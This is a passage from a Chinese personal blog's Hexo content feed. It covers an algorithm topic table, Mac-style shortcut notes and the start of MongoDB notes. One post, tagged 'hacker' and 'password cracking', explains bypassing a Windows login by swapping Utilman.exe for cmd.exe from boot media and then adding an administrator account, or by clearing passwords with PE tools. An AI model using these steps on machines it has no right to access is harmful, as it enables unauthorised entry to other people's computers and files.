</tr>    <tr>        <td>11</td>        <td colspan="2">随机化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>12</td>        <td colspan="1">前缀和</td>        <td>二维前缀和</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>13</td>        <td colspan="2">高精度算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>14</td>        <td colspan="1">递归算法</td>        <td>矩阵加速递推</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="16">15</td>        <td rowspan="16">搜索算法</td>        <td>深度优先搜索（DFS）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>广度优先搜索（BFS）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>双向广度优先搜索</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>启发式搜索（A*算法）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>迭代加深的A*算法（IDA*算法）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>X算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DLX(用双向十字链表优化X算法)</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>记忆化搜索</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>剪枝</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可行性剪枝</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最优性剪枝</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>玄学剪枝</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>模拟退火</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>遗传算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>爬山算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>随机化搜索</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">16</td>        <td rowspan="2">莫队</td>        <td>树上莫队</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>带修改的莫队</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>17</td>        <td>打表</td>        <td>分段打表</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>18</td>        <td colspan="2">卡常</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">19</td>        <td rowspan="2">快速幂</td>        <td>矩阵快速幂</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>龟(慢)速乘</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="20">20</td>        <td rowspan="20">动态规划</td>        <td>LCS（最长公共子序列）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>01背包</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>完全背包</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>多重背包</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>多维背包</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>区间DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>状压DP-普通状压</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>状压DP-枚举子集DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>状压DP-斯坦纳树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>状压DP-插头DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>数位DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树形DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>基环树DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>环形DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>环+外向树上的DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>期望DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>记忆化DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DAG上的DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>多维动态规划</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DP套DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="6">21</td>        <td rowspan="6">DP的优化</td>        <td>斜率优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>四边形不等式优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>改变状态优化DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>寻址优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>单调队列优化DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线段树优化DP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td colspan="4">数论</td>    </tr>    <tr>        <td rowspan="10">22</td>        <td rowspan="10">数论</td>        <td>积性函数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Euclid算法（欧几里得、辗转相除法）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>素数-暴力判素数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Miller-Rabbin素数检测</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>埃拉托色尼筛求素数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线性筛（欧拉筛）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>分解质因数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>求单个值的欧拉函数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线性筛欧拉函数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>欧拉定理</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">23</td>        <td rowspan="2">中国剩余定理(CRT)</td>        <td>互质版</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>不互质版</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>24</td>        <td colspan="2">莫比乌斯函数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>25</td>        <td colspan="2">迪利克雷卷积</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="2">26</td>        <td rowspan="2">容斥原理</td>        <td>抽屉原理（鸽巢原理）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Ramsey定理</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>27</td>        <td colspan="2">费马小定理</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="3">28</td>        <td rowspan="3">逆元</td>        <td>线性求逆元</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>exgcd求逆元</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>费马小定理求逆元</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>29</td>        <td colspan="2">高斯消元</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="10">30</td>        <td rowspan="10">计算几何</td>        <td>基础知识</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>向量（点积、叉积）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>凸包</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>旋转卡壳</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>半平面交</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>随机增量</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Pick定理</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>梯形剖分&三角剖分</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>扫描线</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>凸包问题</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="18">31</td>        <td rowspan="18">字符串</td>        <td>KMP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>exKMP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Manacher</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>字符串Hash</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>AC自动机</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>fail树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>后缀数组</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>倍增</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DC3</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>后缀自动机</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>后缀树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>后缀平衡树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>后缀仙人掌</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Trie树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>可持久化Trie树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Trie图</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>回文自动机</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最小表示法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td colspan="4">图论</td>    </tr>    <tr>        <td rowspan="38">32</td>        <td rowspan="38">图论</td>        <td>Bron-Kerbosch算法（最大团，最大独立集）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>图的遍历</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DFS</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>BFS</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>DBFS（双向广搜）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>SPFA</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>SLF优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>LLL优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Dijkstra</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>堆优化Dijkstra</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>线段树优化Dijkstra</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Floyd</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>倍增Floyd</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>K短路</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最长路</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>差分约束</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Tarjan</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>2-Sat</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>拓扑排序-Kahn算法</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>二分图最大匹配（匈牙利）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>二分图最大权分配（KM）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>网络流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最大流/最小割</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Dinic</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>ISAP</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>循环流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最小费用最大流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>SPFA费用流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>ZKW费用流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>有上下界的网络流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>数据结构优化网络流</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>分数规划</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>欧拉图</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>区间图与弦图</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>平面图与对偶图</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最小树形图（朱刘算法）</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>仙人掌</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>动态仙人掌</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td rowspan="8">33</td>        <td rowspan="8">博弈论</td>        <td>BashGame</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>WythoffGame</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>NimmGame</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>SG函数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>A-Beta剪枝</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>博弈树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>极大极小搜索</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树形图博弈</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td colspan="4">树论</td>    </tr>    <tr>        <td rowspan="26">34</td>        <td rowspan="26">树论</td>        <td>分数树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Kruskal</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Prim及其堆优化</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>次小生成树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最大生成树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最优比率生成树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>最小瓶颈生成树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>生成树计数</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>暴力统计</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Matrix-Tree定理</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树剖</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树链剖分</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>虚树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>基环树</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>rufer序列</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>括号序列</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树上倍增</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树的直径</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树的重心</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树分治</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树分治-点分治</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树分治-边分治</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树分治-动态树分治</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>Link-Cut-Tree</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>树分块</td>        <td>C++/JAVA</td>    </tr>    <tr>        <td>解答树</td>        <td>C++/JAVA</td>    </tr></table>]]></content>
    
    
    <categories>
      
      <category>算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>ACM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows登录密码破解</title>
    <link href="/2021/07/24/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/Windows%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <url>/2021/07/24/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/Windows%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>Windows登录密码破解。</p><hr><h2 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a>1.方法一</h2><blockquote><ol><li>首先需要有Windows的启动盘。</li></ol></blockquote><blockquote><ol start="2"><li>插入U盘进入BIOS，选择U盘启动。</li></ol></blockquote><blockquote><ol start="3"><li>出现界面后，先点下一步。再点击左下角的<code>修复计算机</code>。</li></ol></blockquote><blockquote><ol start="4"><li>再选择 <code>疑难解答</code>，在高级选项中，选择<code>命令提示符</code>进入命令窗口界面。</li></ol></blockquote><blockquote><ol start="5"><li>将启动的界面（即Windows登录界面）换成可以用命令输入的窗口。依次输入以下命令：</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 需要先cd到d盘</span><br>move d:\Windows\System32\Utilman.exe d:\Windows\System32\utilman.exe.bak<br><br>copy d:\Windows\System32\cmd.exe d:\Windows\System32\utilman.exe<br>(move d:\Windows\System32\cmd.exe d:\Windows\System32\utilman.exe)<br><br>wpeutil reboot <span class="hljs-comment"># 重启   这时候需要把U盘拔掉</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>在登录界面点击<code>轻松使用</code>图标，在弹出的命令窗口中开始创建一个新用户，这个用户的权限和之前的用户一样，可以访问之前的所有的文件。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net user name /add  <span class="hljs-comment"># 删除用户 net user name /del</span><br>net localgroup administrators name /add<br></code></pre></div></td></tr></table></figure><p>然后再点击右下角的<code>电源</code> ，重启一下。</p><blockquote><ol start="7"><li>重启之后可以在<code>左下角</code>看见有一个刚才创建的用户，点击进入。如果没有出现，按两次<code>Ctrl+ALT+del</code></li></ol></blockquote><h2 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a>2.方法二</h2><blockquote><ol><li>制作启动盘</li></ol></blockquote><p>优启通、微PE</p><blockquote><ol start="2"><li>进入启动盘</li></ol></blockquote><blockquote><ol start="3"><li>开始-&gt;程序-&gt;密码相关</li></ol></blockquote><blockquote><ol start="4"><li>点击 打开，选择对应账号的用户名，修改密码（解锁是把密码清空，不设置密码），保持修改，退出，再重新启动即可。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>黑客</tag>
      
      <tag>Windows</tag>
      
      <tag>密码破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Win10联想黑苹果Mac使用快捷键</title>
    <link href="/2021/07/20/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/Win10%E8%81%94%E6%83%B3%E9%BB%91%E8%8B%B9%E6%9E%9CMac%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <url>/2021/07/20/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/Win10%E8%81%94%E6%83%B3%E9%BB%91%E8%8B%B9%E6%9E%9CMac%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="黑苹果快捷键（WIN10）"><a href="#黑苹果快捷键（WIN10）" class="headerlink" title="黑苹果快捷键（WIN10）"></a>黑苹果快捷键（WIN10）</h2><h2 id="1-最小化当前窗口"><a href="#1-最小化当前窗口" class="headerlink" title="1.最小化当前窗口"></a>1.最小化当前窗口</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + m<br></code></pre></div></td></tr></table></figure><h2 id="2-全屏截图"><a href="#2-全屏截图" class="headerlink" title="2.全屏截图"></a>2.全屏截图</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + <span class="hljs-built_in">shift</span> + 3<br></code></pre></div></td></tr></table></figure><h2 id="3-选取截图"><a href="#3-选取截图" class="headerlink" title="3.选取截图"></a>3.选取截图</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + <span class="hljs-built_in">shift</span> + 4<br></code></pre></div></td></tr></table></figure><h2 id="4-关闭窗口"><a href="#4-关闭窗口" class="headerlink" title="4.关闭窗口"></a>4.关闭窗口</h2><h3 id="4-1-软件关闭窗口，但不退出"><a href="#4-1-软件关闭窗口，但不退出" class="headerlink" title="4.1 软件关闭窗口，但不退出"></a>4.1 软件关闭窗口，但不退出</h3><h3 id="4-2-浏览器直接关闭当前窗口"><a href="#4-2-浏览器直接关闭当前窗口" class="headerlink" title="4.2 浏览器直接关闭当前窗口"></a>4.2 浏览器直接关闭当前窗口</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + w<br></code></pre></div></td></tr></table></figure><h2 id="5-退出软件"><a href="#5-退出软件" class="headerlink" title="5.退出软件"></a>5.退出软件</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + q<br></code></pre></div></td></tr></table></figure><h2 id="6-移到废纸篓"><a href="#6-移到废纸篓" class="headerlink" title="6.移到废纸篓"></a>6.移到废纸篓</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + Backspace<br></code></pre></div></td></tr></table></figure><h2 id="7-清空废纸篓"><a href="#7-清空废纸篓" class="headerlink" title="7.清空废纸篓"></a>7.清空废纸篓</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + <span class="hljs-built_in">shift</span> + Backspace<br></code></pre></div></td></tr></table></figure><h2 id="8-新建文件夹"><a href="#8-新建文件夹" class="headerlink" title="8.新建文件夹"></a>8.新建文件夹</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + <span class="hljs-built_in">shift</span> + n<br></code></pre></div></td></tr></table></figure><h2 id="9-新建标签页"><a href="#9-新建标签页" class="headerlink" title="9.新建标签页"></a>9.新建标签页</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + t<br></code></pre></div></td></tr></table></figure><h2 id="10-新建窗口"><a href="#10-新建窗口" class="headerlink" title="10.新建窗口"></a>10.新建窗口</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + n<br></code></pre></div></td></tr></table></figure><h2 id="11-新窗口打开最后关闭的标签页"><a href="#11-新窗口打开最后关闭的标签页" class="headerlink" title="11.新窗口打开最后关闭的标签页"></a>11.新窗口打开最后关闭的标签页</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + <span class="hljs-built_in">shift</span> + t<br></code></pre></div></td></tr></table></figure><h2 id="12-隐藏下方显示软件"><a href="#12-隐藏下方显示软件" class="headerlink" title="12.隐藏下方显示软件"></a>12.隐藏下方显示软件</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + Alt + D<br></code></pre></div></td></tr></table></figure><h2 id="13-隐藏文件显示"><a href="#13-隐藏文件显示" class="headerlink" title="13.隐藏文件显示"></a>13.隐藏文件显示</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + Shift + .<br></code></pre></div></td></tr></table></figure><h2 id="14-终端分屏"><a href="#14-终端分屏" class="headerlink" title="14.终端分屏"></a>14.终端分屏</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">win + D //竖直分屏<br>win + Shift + D //取消分屏<br></code></pre></div></td></tr></table></figure><h2 id="15-终端操作"><a href="#15-终端操作" class="headerlink" title="15.终端操作"></a>15.终端操作</h2><h3 id="15-1-光标移到行首"><a href="#15-1-光标移到行首" class="headerlink" title="15.1 光标移到行首"></a>15.1 光标移到行首</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + A<br></code></pre></div></td></tr></table></figure><h3 id="15-2-光标移到行尾"><a href="#15-2-光标移到行尾" class="headerlink" title="15.2 光标移到行尾"></a>15.2 光标移到行尾</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + E<br></code></pre></div></td></tr></table></figure><h3 id="15-3-清除屏幕"><a href="#15-3-清除屏幕" class="headerlink" title="15.3 清除屏幕"></a>15.3 清除屏幕</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + L<br>clear<br></code></pre></div></td></tr></table></figure><h3 id="15-4-搜索使用过的命令"><a href="#15-4-搜索使用过的命令" class="headerlink" title="15.4 搜索使用过的命令"></a>15.4 搜索使用过的命令</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + R<br></code></pre></div></td></tr></table></figure><h3 id="15-5-删除当前行"><a href="#15-5-删除当前行" class="headerlink" title="15.5 删除当前行"></a>15.5 删除当前行</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + U<br></code></pre></div></td></tr></table></figure><h3 id="15-6-从当前删除到行尾"><a href="#15-6-从当前删除到行尾" class="headerlink" title="15.6 从当前删除到行尾"></a>15.6 从当前删除到行尾</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + K <br></code></pre></div></td></tr></table></figure><h3 id="15-7-以单词为单位移到"><a href="#15-7-以单词为单位移到" class="headerlink" title="15.7 以单词为单位移到"></a>15.7 以单词为单位移到</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Alt(Option) + 方向键<br></code></pre></div></td></tr></table></figure><h3 id="15-8-删除当前选中"><a href="#15-8-删除当前选中" class="headerlink" title="15.8 删除当前选中"></a>15.8 删除当前选中</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Ctrl + D<br></code></pre></div></td></tr></table></figure><h2 id="安装hexo（Mac）"><a href="#安装hexo（Mac）" class="headerlink" title="安装hexo（Mac）"></a>安装hexo（Mac）</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo npm install -g hexo<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MongoDB学习笔记（一）入门基础</title>
    <link href="/2021/07/18/MongoDB/MongoDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/07/18/MongoDB/MongoDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>MongoDB 是由C++语言编写的，是一个基于分布式文件存储的开源数据库系统。是一个面向文档存储的数据库，操作起来比较简单和容易。在高负载的情况下，添加更多的节点，可以保证服务器性能。MongoDB 旨在为WEB应用提供可扩展的高性能数据存储解决方案。将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-安装"><a href="#0-安装" class="headerlink" title="0.安装"></a>0.安装</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">brew tap mongodb/brew<br>brew install mongodb-community@<span class="hljs-number">4.2</span> <span 